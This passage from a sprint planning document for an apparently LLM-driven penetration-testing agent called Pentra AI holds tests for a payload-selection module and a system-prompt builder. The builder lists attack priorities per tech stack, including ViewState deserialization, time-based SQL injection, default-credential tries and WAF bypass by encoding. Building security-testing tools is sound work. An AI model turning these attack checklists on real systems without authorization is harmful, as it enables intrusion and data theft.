    payloads = ExploitArsenal.get_payloads("SQL_INJECTION", ["MySQL", "PHP"])
    assert any("SLEEP" in p for p in payloads), "MySQL SLEEP payload must exist"


def test_lfi_windows_returns_aspnet_payloads():
    payloads = ExploitArsenal.get_payloads("PATH_TRAVERSAL", ["IIS", "ASP.NET"])
    assert any("web.config" in p for p in payloads), "web.config traversal must exist"
    assert any("win.ini" in p for p in payloads), "win.ini traversal must exist"


def test_xss_returns_multiple_categories():
    payloads = ExploitArsenal.get_payloads("XSS")
    assert len(payloads) >= 3
    assert any("<script>" in p for p in payloads)


def test_unknown_vuln_class_returns_empty():
    payloads = ExploitArsenal.get_payloads("NONEXISTENT_VULN")
    assert payloads == []


def test_detection_payloads_minimal():
    payloads = ExploitArsenal.get_detection_payloads("SSTI")
    assert len(payloads) <= 5
    assert any("{{" in p for p in payloads)
```

---

## Task 18.5 — Dynamic LLM Prompts

> **Dari:** ARTEMIS dynamic prompt generation per target context  
> **Estimasi:** 2 jam  
> **Impact:** +15% precision — LLM lebih fokus dan kontekstual per target

```python
# packages/pentra-agent/pentra_agent/llm/dynamic_prompt.py

"""
Dynamic prompt generator — system prompt yang berubah sesuai target context.
Terinspirasi dari ARTEMIS dynamic prompt generation.
Bukan static "You are a pentester" — berubah berdasarkan tech stack dan findings.
"""


# ── Tech-specific attack context ──────────────────────────────────────────────

TECH_CONTEXTS: dict[str, str] = {
    "asp.net": """Target runs ASP.NET on IIS. Priority tests:
1. ViewState deserialization — test __VIEWSTATE with ysoserial payloads
2. SQL injection on integer params (id=, cat=, pid=) — try WAITFOR DELAY first
3. Path traversal to web.config — contains DB credentials if exposed
4. IDOR on user/order endpoints — ASP.NET often uses sequential IDs""",

    "iis": """Target runs IIS. Additional checks:
1. IIS short filename enumeration: GET /*.~1 → if HTTP 400 instead of 404, vulnerable
2. WebDAV methods: OPTIONS request, check for PROPFIND/PUT
3. ASP classic injection if .asp files found
4. HTTP.sys vulnerabilities if older IIS version""",

    "laravel": """Target runs Laravel PHP. Priority:
1. /telescope, /_debugbar, /horizon — debug endpoints often enabled in staging
2. Mass assignment: try extra fields in POST requests
3. CSRF — API routes often skip CSRF validation
4. SQL injection via Eloquent ORM if raw queries used""",

    "django": """Target runs Django Python. Priority:
1. /admin/ endpoint — often exposed, try default creds
2. DEBUG=True exposure — reveals stack traces with config
3. SQL injection on ORM raw() calls
4. CSRF token bypass via CORS misconfiguration""",

    "spring": """Target runs Spring Java. Priority:
1. Spring Actuator endpoints — /actuator/env, /actuator/beans, /actuator/mappings
2. Spring EL injection in SpEL expressions
3. Path traversal via :: separator
4. Deserialization in Java serialization endpoints""",

    "graphql": """Target exposes GraphQL. Priority:
1. Introspection — GET /graphql?query={__schema{types{name}}}
2. Batch query attacks — array of queries in single request
3. Deep query attacks — nested objects for DoS
4. IDOR via ID manipulation in queries
5. Mass assignment via mutations""",

    "wordpress": """Target runs WordPress. Priority:
1. /wp-json/wp/v2/users — user enumeration
2. XML-RPC if enabled — brute force and SSRF
3. Plugin vulnerabilities — check installed plugins
4. wp-config.php backup files — /wp-config.php.bak""",
}


def build_vuln_hunt_system_prompt(
    tech_stack: list[str],
    prior_findings: list[dict],
    engagement_learnings: list[dict],
    waf_info: dict | None = None,
) -> str:
    """
    Generate system prompt yang kontekstual untuk vuln hunt.
    Berubah sesuai: tech stack + prior findings + learnings + WAF status.
    """
    sections = []

    # Base role
    sections.append(
        "You are a senior penetration tester conducting web application security testing. "
        "Think step by step. Prioritize findings by real, demonstrable impact."
    )

    # Tech-specific context
    tech_lower_str = " ".join(t.lower() for t in tech_stack)
    tech_sections = []
    for tech_key, context in TECH_CONTEXTS.items():
        if tech_key in tech_lower_str:
            tech_sections.append(context)

    if tech_sections:
        sections.append("\n## Target Tech Stack Context\n" + "\n\n".join(tech_sections))
    else:
        sections.append("\n## Target\nGeneric web application. Test common vuln classes.")

    # Prior findings context
    if prior_findings:
        high_impact = [f for f in prior_findings if f.get("severity") in ("critical", "high")]
        if high_impact:
            finding_lines = "\n".join(
                f"- [{f.get('severity','').upper()}] {f.get('title','')} at {f.get('target_url','')}"
                for f in high_impact[:5]
            )
            sections.append(
                f"\n## Already Confirmed Findings ({len(high_impact)} high/critical)\n"
                f"{finding_lines}\n"
                f"Build on these — try to chain them for higher impact."
            )

    # WAF context
    if waf_info and waf_info.get("waf_type"):
        bypass = waf_info.get("bypass_strategies", [])
        sections.append(
            f"\n## WAF Detected: {waf_info['waf_type']}\n"
            f"Is blocking: {waf_info.get('is_blocking', False)}\n"
            f"Bypass strategies to try: {', '.join(bypass[:3])}\n"
            f"Use encoded payloads. URL double-encode, Unicode bypass, or case variation."
        )

    # Learning context
    if engagement_learnings:
        effective = [
            l for l in engagement_learnings
            if l.get("effective_tools") or l.get("high_value_endpoints")
        ]
        if effective:
            learning_lines = []
            for l in effective[:2]:
                if l.get("high_value_endpoints"):
                    eps = [ep.get("pattern", "") for ep in l["high_value_endpoints"][:3]]
                    learning_lines.append(f"High-value endpoint patterns: {', '.join(eps)}")
            if learning_lines:
                sections.append(
                    "\n## Historical Learning (from similar past engagements)\n" +
                    "\n".join(learning_lines)
                )

    # Developer psychology heuristics
    sections.append("""
## Developer Psychology — Where Bugs Hide
1. v2 API endpoints are often added quickly, missing auth checks that v1 has
2. Integer ID parameters assume users won't guess other IDs (IDOR)
3. Admin functionality at /admin/, /api/admin/ often has weaker auth
4. New features copy old code — check for deprecated auth patterns
5. Error messages in production often reveal stack traces or config
6. File serving endpoints (/view?file=, /load?path=) often lack path validation""")

    return "\n".join(sections)
```

**Integrasi ke vuln_hunt_node.py:**

```python
# packages/pentra-agent/pentra_agent/nodes/vuln_hunt_node.py
from pentra_agent.llm.dynamic_prompt import build_vuln_hunt_system_prompt

# Ganti static system prompt dengan dynamic:
system_prompt = build_vuln_hunt_system_prompt(
    tech_stack=state.get("tech_stack", []),
    prior_findings=state.get("findings", []),
    engagement_learnings=state.get("knowledge_context", []),
    waf_info=state.get("waf_info"),
)

llm = LLMClient(
    base_url=_get_ollama_url(),
    model=state["llm_model"],
    system_override=system_prompt,  # Override default system prompt
)
```

---

## Update PentraState — Tambah Fields Baru

```python
# packages/pentra-agent/pentra_agent/graph/state.py
# Tambahkan fields untuk Sprint 18:

class PentraState(TypedDict):
    # ... existing fields ...

    # Sprint 18 additions
    waf_info: dict | None           # WAFProfile result dari recon
    gf_matches: list[dict]          # GF pattern matches untuk vuln hunt context
    endpoint_dedup_ratio: float     # Berapa % endpoint di-dedup
```

---

## Checklist Sprint 18

```
Task 18.1 — GF Patterns
[ ] gf_filter.py dibuat dengan 15+ patterns
[ ] apply_gf_patterns() function dengan prioritization
[ ] prioritize_endpoints_for_vuln_hunt() function
[ ] 7 unit tests pass
[ ] recon_node.py memanggil GF filter setelah httpx probe
[ ] Log: "X/Y endpoints have vuln hints"

Task 18.2 — Smart Dedup
[ ] dedup.py dibuat dengan content fingerprint
[ ] smart_dedup_endpoints() function
[ ] 3 unit tests pass
[ ] recon_node.py memanggil dedup sebelum GF filter
[ ] Log: "N→M endpoints (K duplicates removed)"

Task 18.3 — WAFProfiler
[ ] waf_profiler.py dibuat dengan 9 WAF fingerprints
[ ] profile_waf() function
[ ] 2 unit tests pass
[ ] recon_node.py memanggil WAFProfiler setelah httpx probe
[ ] waf_info tersimpan di PentraState
[ ] Log: "WAF: cloudflare (blocking=True) → bypass: unicode_bypass, case_variation"

Task 18.4 — ExploitArsenal
[ ] exploit_arsenal.py dibuat dengan 6 vuln classes
[ ] ExploitArsenal.get_payloads() function dengan tech stack awareness
[ ] 6 unit tests pass
[ ] vuln_hunt_node.py menggunakan ExploitArsenal untuk payload selection
[ ] MSSQL target mendapat WAITFOR DELAY payloads
[ ] IIS/ASP.NET target mendapat web.config traversal payloads

Task 18.5 — Dynamic Prompts
[ ] dynamic_prompt.py dibuat dengan 7 tech contexts
[ ] build_vuln_hunt_system_prompt() function
[ ] vuln_hunt_node.py menggunakan dynamic prompt
[ ] Log berbeda untuk target ASP.NET vs Laravel vs Django

E2E Validation
[ ] Jalankan engagement baru pada testaspnet.vulnweb.com
[ ] Log menunjukkan GF matches (id=1, cat=1 harus match sqli_int)
[ ] Log menunjukkan WAF profile (harusnya no WAF atau generic)
[ ] ExploitArsenal menyediakan MSSQL payloads untuk ASP.NET target
[ ] Dynamic prompt menyebut "ViewState deserialization" dan "WAITFOR DELAY"
[ ] Findings >= 10 (sama atau lebih dari sebelumnya)

Total tests baru: 7+3+2+6 = 18+ tests
Total tests target: 144 + 18 = 162+ passing
```

---

## Prompt untuk Copilot

**Mulai Task 18.1 + 18.2 (cepat):**

```
Baca CLAUDE.md, PROGRESS_REPORT.md, dan SPRINT-18.md secara lengkap.

Kita mulai Sprint 18 — implementasi enhancement dari XBOW, ARTEMIS, reNgine, TermiAgent.

Task 18.1 — GF Patterns:
1. Buat packages/pentra-tools/pentra_tools/recon/gf_filter.py
   sesuai kode di SPRINT-18.md Task 18.1
2. Buat packages/pentra-tools/tests/test_gf_filter.py dengan 7 tests
3. Jalankan tests, pastikan pass
4. Update recon_node.py — panggil prioritize_endpoints_for_vuln_hunt()
   setelah httpx probe, sebelum return

Task 18.2 — Smart Dedup (langsung setelah 18.1):
1. Buat packages/pentra-tools/pentra_tools/recon/dedup.py
2. Buat packages/pentra-tools/tests/test_dedup.py dengan 3 tests
3. Update recon_node.py — panggil dedup SEBELUM GF filter

Setelah keduanya selesai: uv run pytest packages/pentra-tools/tests/ -q
Expected: semua tests pass.
```

**Task 18.3 + 18.4 (setelah 18.1-18.2 pass):**

```
Task 18.1 dan 18.2 selesai. Lanjut:

Task 18.3 — WAFProfiler:
Buat waf_profiler.py sesuai SPRINT-18.md Task 18.3.
2 unit tests. Integrasikan ke recon_node.py.

Task 18.4 — ExploitArsenal:
Buat exploit_arsenal.py sesuai SPRINT-18.md Task 18.4.
6 unit tests. Update vuln_hunt_node.py untuk pakai ExploitArsenal.
```

**Task 18.5 + E2E:**

```
Task 18.3 dan 18.4 selesai.

Task 18.5 — Dynamic Prompts:
Buat dynamic_prompt.py sesuai SPRINT-18.md Task 18.5.
Ganti static system prompt di vuln_hunt_node.py dengan build_vuln_hunt_system_prompt().

Setelah selesai, jalankan full test suite:
  uv run pytest packages/ -q
Expected: 162+ tests, 0 failed.

Lalu laporkan hasil agar bisa dilanjutkan ke E2E validation run.
```

---

*SPRINT-18.md — Pentra AI*  
*Gabungan: COMPETITIVE-ENHANCEMENT-2026.md + RENGINE-ADOPTION.md*  
*XBOW (concurrent/SOAP), ARTEMIS (triage/dynamic prompt),*  
*TermiAgent (ExploitArsenal/Memory), reNgine (GF patterns/dedup/WAF)*  
*Target: 162+ tests, E2E run lebih akurat dan lebih cepat*
